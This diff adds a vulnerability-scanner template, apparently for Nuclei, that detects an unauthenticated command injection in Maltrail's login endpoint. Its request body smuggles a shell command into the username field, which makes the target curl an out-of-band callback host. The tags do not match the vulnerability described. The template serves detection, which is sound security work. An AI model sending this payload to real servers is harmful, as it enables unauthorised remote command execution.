@@ -1,0 +1,46 @@
+id: maltrail-os-command-injection
+info:
+  name: Maltrail <= v0.54 - Unauthenticated OS Command Injection
+  author: pussycat0x
+  severity: critical
+  description: |
+    The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get("username")parameter.
+    An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.
+  reference:
+    - https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: "Server: Maltrail"
+  tags: ciamore-gateway,default-login
+
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}
+
+        username=;`curl {{interactsh-url}}`
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "Server: Maltrail"
+
+      - type: status
+        status:
+          - 401
